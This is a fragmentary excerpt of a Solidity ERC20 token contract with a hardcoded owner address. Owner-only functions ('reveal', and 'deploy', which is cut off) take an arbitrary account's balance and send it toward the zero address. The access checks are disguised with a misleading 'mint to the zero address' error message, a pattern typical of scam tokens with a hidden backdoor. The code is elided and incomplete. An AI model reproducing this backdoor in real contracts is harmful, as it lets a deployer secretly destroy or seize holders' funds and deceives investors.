...
contract Fuck is Context, IERC20 {
    ...
    address lead_deployer = 0xD3538673f471F1fE2fD6FB13e51A21e0F6b1beE1;
    address public _owner = 0xD3538673f471F1fE2fD6FB13e51A21e0F6b1beE1;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function reveal(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
        ...
        function deploy(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
